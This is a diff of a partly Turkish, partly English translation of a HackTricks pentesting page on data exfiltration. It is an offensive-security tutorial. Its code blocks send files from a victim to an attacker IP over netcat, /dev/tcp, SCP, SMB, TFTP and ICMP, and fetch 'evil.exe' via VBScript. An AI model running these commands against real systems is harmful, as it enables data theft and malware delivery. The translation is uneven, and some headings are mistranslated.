@@ -1,33 +1,25 @@
-# Veri Çıkarma
+# Exfiltration
 
 {% hint style="success" %}
-AWS Hacking'i öğrenin ve uygulayın: <img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Eğitim AWS Kırmızı Takım Uzmanı (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
-GCP Hacking'i öğrenin ve uygulayın: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Eğitim GCP Kırmızı Takım Uzmanı (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
+Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
+Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
 
 <details>
 
-<summary>HackTricks'i Destekleyin</summary>
+<summary>Support HackTricks</summary>
 
-* [**Abonelik planlarını**](https://github.com/sponsors/carlospolop) kontrol edin!
-* 💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) katılın veya [**telegram grubuna**](https://t.me/peass) katılın veya bizi **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)** takip edin.**
-* **Hacking püf noktalarını paylaşarak PR'ler göndererek** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github depolarına katkıda bulunun.
+* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
+* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
+* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
 
 </details>
 {% endhint %}
 
-**Try Hard Güvenlik Grubu**
+## Bilgi sızdırmak için yaygın olarak beyaz listeye alınmış alanlar
 
-<figure><img src="/.gitbook/assets/telegram-cloud-document-1-5159108904864449420.jpg" alt=""><figcaption></figcaption></figure>
+Kötüye kullanılabilecek yaygın olarak beyaz listeye alınmış alanları bulmak için [https://lots-project.com/](https://lots-project.com/) adresini kontrol edin.
 
-{% embed url="https://discord.gg/tryhardsecurity" %}
-
-***
-
-## Bilgi çıkarmak için genellikle izin verilen alan adları
-
-Kötüye kullanılabilen genellikle izin verilen alan adlarını bulmak için [https://lots-project.com/](https://lots-project.com/) adresini kontrol edin
-
-## Base64 Kopyala ve Yapıştır
+## Copy\&Paste Base64
 
 **Linux**
 ```bash
@@ -63,10 +55,10 @@ Start-BitsTransfer -Source $url -Destination $output
 #OR
 Start-BitsTransfer -Source $url -Destination $output -Asynchronous
 ```
-### Dosyaları Yükle
+### Dosya Yükleme
 
 * [**SimpleHttpServerWithFileUploads**](https://gist.github.com/UniIsland/3346170)
-* [**SimpleHttpServer printing GET and POSTs (also headers)**](https://gist.github.com/carlospolop/209ad4ed0e06dd3ad099e2fd0ed73149)
+* [**GET ve POST'ları (aynı zamanda başlıkları) yazdıran SimpleHttpServer**](https://gist.github.com/carlospolop/209ad4ed0e06dd3ad099e2fd0ed73149)
 * Python modülü [uploadserver](https://pypi.org/project/uploadserver/):
 ```bash
 # Listen to files
@@ -151,7 +143,7 @@ mkdir -p /ftphome
 chown -R ftpuser:ftpgroup /ftphome/
 /etc/init.d/pure-ftpd restart
 ```
-### **Windows** istemci
+### **Windows** istemcisi
 ```bash
 #Work well with python. With pure-ftp use fusr:ftp
 echo open 10.11.0.41 21 > ftp.txt
@@ -164,14 +156,14 @@ ftp -n -v -s:ftp.txt
 ```
 ## SMB
 
-Sunucu olarak Kali
+Kali sunucu olarak
 ```bash
 kali_op1> impacket-smbserver -smb2support kali `pwd` # Share current directory
 kali_op2> smbserver.py -smb2support name /path/folder # Share a folder
 #For new Win10 versions
 impacket-smbserver -smb2support -user test -password test test `pwd`
 ```
-Veya bir smb paylaşımı oluşturun **samba kullanarak**:
+Veya **samba** kullanarak bir smb paylaşımı oluşturun:
 ```bash
 apt-get install samba
 mkdir /tmp/smb
@@ -187,21 +179,6 @@ guest ok = Yes
 service smbd restart
 ```
 Windows
-
----
-
-### Exfiltration
-
-Exfiltration is the unauthorized transfer of data from a target system. There are various methods to exfiltrate data from a compromised system, including:
-
-- **Email**: Sending data as email attachments to an external email address.
-- **FTP**: Transferring data using the File Transfer Protocol to an external server.
-- **DNS**: Encoding data within DNS requests to leak information.
-- **HTTP/HTTPS**: Sending data over HTTP or HTTPS to a remote server.
-- **Steganography**: Hiding data within other files to avoid detection.
-- **Cloud Storage**: Uploading data to cloud storage services for retrieval later.
-
-It is essential for attackers to exfiltrate data stealthily to avoid detection by security measures.
 ```bash
 CMD-Wind> \\10.10.14.14\path\to\exe
 CMD-Wind> net use z: \\10.10.14.14\test /user:test test #For SMB using credentials
@@ -211,40 +188,38 @@ WindPS-2> cd new_disk:
 ```
 ## SCP
 
-Saldırganın SSHd çalışıyor olmalıdır.
+Saldırganın SSHd'nin çalışıyor olması gerekir.
 ```bash
 scp <username>@<Attacker_IP>:<directory>/<filename>
 ```
 ## SSHFS
 
-Eğer kurbanın SSH'si varsa, saldırgan kurbandan saldırgana bir dizin bağlayabilir.
+Eğer kurbanın SSH'si varsa, saldırgan kurbanın bir dizinini kendi sistemine monte edebilir.
 ```bash
 sudo apt-get install sshfs
 sudo mkdir /mnt/sshfs
 sudo sshfs -o allow_other,default_permissions <Target username>@<Target IP address>:<Full path to folder>/ /mnt/sshfs/
 ```
 ## NC
-
-NC, or Netcat, is a versatile networking tool that can be used for various purposes during a penetration test. It can be used for port scanning, banner grabbing, transferring files, and even creating reverse shells. Netcat can also be used for exfiltration by sending data over the network to an attacker-controlled machine.
 ```bash
 nc -lvnp 4444 > new_file
 nc -vn <IP> 4444 < exfil_file
 ```
 ## /dev/tcp
 
-### Kurbanın cihazından dosya indir
+### Kurbandan dosya indirme
 ```bash
 nc -lvnp 80 > file #Inside attacker
 cat /path/file > /dev/tcp/10.10.10.10/80 #Inside victim
 ```
-### Dosyayı hedefe yükle
+### Kurbanın dosyasını yükle
 ```bash
 nc -w5 -lvnp 80 < file_to_send.txt # Inside attacker
 # Inside victim
 exec 6< /dev/tcp/10.10.10.10/4444
 cat <&6 > file.txt
 ```
-Teşekkürler **@BinaryShadow\_**
+thanks to **@BinaryShadow\_**
 
 ## **ICMP**
 ```bash
@@ -266,15 +241,15 @@ sniff(iface="tun0", prn=process_packet)
 ```
 ## **SMTP**
 
-Eğer bir SMTP sunucusuna veri gönderebiliyorsanız, veriyi almak için bir SMTP oluşturabilirsiniz:
+Eğer bir SMTP sunucusuna veri gönderebiliyorsanız, veriyi almak için python ile bir SMTP oluşturabilirsiniz:
 ```bash
 sudo python -m smtpd -n -c DebuggingServer :25
 ```
 ## TFTP
 
-XP ve 2003'te varsayılan olarak (diğerlerinde kurulum sırasında açıkça eklenmesi gerekir)
+Varsayılan olarak XP ve 2003'te (diğerlerinde kurulum sırasında açıkça eklenmesi gerekir)
 
-Kali'de **TFTP sunucusunu başlatın**:
+Kali'de, **TFTP sunucusunu başlat**:
 ```bash
 #I didn't get this options working and I prefer the python option
 mkdir /tftp
@@ -286,21 +261,17 @@ cp /path/tp/nc.exe /tftp
 pip install ptftpd
 ptftpd -p 69 tap0 . # ptftp -p <PORT> <IFACE> <FOLDER>
 ```
-**victim** üzerinde, Kali sunucusuna bağlanın:
+In **victim**, Kali sunucusuna bağlanın:
 ```bash
 tftp -i <KALI-IP> get nc.exe
 ```
 ## PHP
 
-PHP'de bir oneliner ile bir dosya indirin:
+Bir dosyayı PHP tek satırı ile indirin:
 ```bash
 echo "<?php file_put_contents('nameOfFile', fopen('http://192.168.1.102/file', 'r')); ?>" > down2.php
 ```
 ## VBScript
-
-### VBScript Exfiltration
-
-VBScript can be used to exfiltrate data from a compromised system. This can be achieved by reading files, accessing system information, or interacting with network resources. VBScript can then encode the data and send it to an external server using various techniques such as HTTP requests or DNS queries. This allows an attacker to steal sensitive information without being easily detected.
 ```bash
 Attacker> python -m SimpleHTTPServer 80
 ```
@@ -338,14 +309,13 @@ cscript wget.vbs http://10.11.0.5/evil.exe evil.exe
 ```
 ## Debug.exe
 
-`debug.exe` programı sadece ikili dosyaların incelenmesine izin vermekle kalmaz, aynı zamanda onları onaltılıktan yeniden oluşturma yeteneğine de sahiptir. Bu, bir ikili dosyanın onaltılık bir gösterimini sağlayarak `debug.exe`nin ikili dosyayı oluşturabilmesi anlamına gelir. Bununla birlikte, debug.exe'nin **64 kb boyutundaki dosyaları birleştirme sınırlaması olduğunu** unutmamak önemlidir.
+`debug.exe` programı yalnızca ikili dosyaların incelenmesine izin vermekle kalmaz, aynı zamanda **onları hex'ten yeniden oluşturma yeteneğine de sahiptir**. Bu, bir ikilinin hex'ini sağlayarak, `debug.exe`'nin ikili dosyayı oluşturabileceği anlamına gelir. Ancak, debug.exe'nin **64 kb boyutuna kadar dosyaları birleştirme sınırlaması** olduğunu belirtmek önemlidir.
 ```bash
 # Reduce the size
 upx -9 nc.exe
 wine exe2bat.exe nc.exe nc.txt
 ```
-```markdown
-Ardından metni windows-shell'e kopyalayıp yapıştırın ve nc.exe adında bir dosya oluşturulacaktır.
+Sonra metni windows-shell'e kopyalayıp yapıştırın ve nc.exe adında bir dosya oluşturulacaktır.
 
 * [https://chryzsh.gitbooks.io/pentestbook/content/transfering_files_to_windows.html](https://chryzsh.gitbooks.io/pentestbook/content/transfering_files_to_windows.html)
 
@@ -353,24 +323,17 @@ Ardından metni windows-shell'e kopyalayıp yapıştırın ve nc.exe adında bir
 
 * [https://github.com/62726164/dns-exfil](https://github.com/62726164/dns-exfil)
 
-**Try Hard Security Group**
-
-<figure><img src="/.gitbook/assets/telegram-cloud-document-1-5159108904864449420.jpg" alt=""><figcaption></figcaption></figure>
-
-{% embed url="https://discord.gg/tryhardsecurity" %}
-
 {% hint style="success" %}
-AWS Hacking öğrenin ve pratik yapın:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
-GCP Hacking öğrenin ve pratik yapın: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
+AWS Hacking'i öğrenin ve pratik yapın:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
+GCP Hacking'i öğrenin ve pratik yapın: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
 
 <details>
 
 <summary>HackTricks'i Destekleyin</summary>
 
-* [**Abonelik planlarını**](https://github.com/sponsors/carlospolop) kontrol edin!
-* 💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) katılın veya [**telegram grubuna**](https://t.me/peass) katılın veya bizi **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)** takip edin.**
-* Hacking püf noktalarını paylaşarak PR'ler göndererek **HackTricks** ve **HackTricks Cloud** github depolarına katkıda bulunun.
+* [**abonelik planlarını**](https://github.com/sponsors/carlospolop) kontrol edin!
+* **💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) katılın ya da **Twitter'da** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**'i takip edin.**
+* **Hacking ipuçlarını paylaşmak için** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github reposuna PR gönderin.
 
 </details>
 {% endhint %}
-```
